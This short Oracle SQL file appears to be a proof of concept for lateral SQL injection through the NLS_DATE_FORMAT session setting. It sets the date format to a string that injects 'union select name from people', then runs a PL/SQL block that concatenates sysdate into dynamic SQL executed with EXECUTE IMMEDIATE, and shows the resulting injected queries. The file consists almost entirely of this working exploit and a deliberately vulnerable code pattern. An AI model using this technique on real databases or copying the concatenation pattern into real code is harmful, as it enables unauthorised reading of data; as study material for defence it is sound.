--To add string literals to the date format, enclose the string literal with double quotes. Note that when double quotation marks are included in the date format, the entire value must be enclosed by single quotation marks. For example:
NLS_DATE_FORMAT = '"Date: "MM/DD/YYYY'
--http://docs.oracle.com/cd/B25329_01/doc/appdev.102/b25108/xedev_global.htm





alter session set nls_date_format = '" from dual union select name from people--"'

alter session set nls_date_format = '"TEST"'

declare 
    l_sql      varchar2(1000);
    l_result   varchar2(1000);
begin    
    l_sql := 'select ''xxx'' '||sysdate||' from dual';
    dbms_output.put_line(l_sql);
    execute immediate l_sql into l_result;
    dbms_output.put_line('result='||l_result);
end;

select 'xxx'  from dual union selectname from people--  from dua


select 'xxx'  from dual union select "name" from "people"-- from dual